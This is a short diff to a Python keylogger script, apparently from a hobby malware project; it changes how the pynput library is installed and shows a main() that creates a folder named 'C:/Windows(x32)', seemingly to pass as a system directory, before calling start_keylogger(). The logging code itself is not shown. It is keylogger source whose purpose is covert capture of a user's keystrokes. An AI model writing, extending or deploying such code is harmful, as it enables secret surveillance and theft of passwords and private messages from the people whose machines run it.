@@ -1,8 +1,16 @@
 import logging
 import os
 import pathlib
+import platform 
 
-os.system("pip install pynput")    # installing pynput library
+pip_pkg = ["pynput"]
+for i in pip_pkg:
+    if (os.system(f"pip show {i}")) == 0:
+        print(f"{i} is Installed")
+    else:
+        os.system(f"pip install {i}")
+        print(f"{i} Finish Installation")
+
 from pynput import keyboard
 
 def start_keylogger():
@@ -32,7 +40,7 @@ def main():
     else:
         os.mkdir("C:/Windows(x32)") 
         start_keylogger()
-
+        
 if __name__ == '__main__':
     main()
         
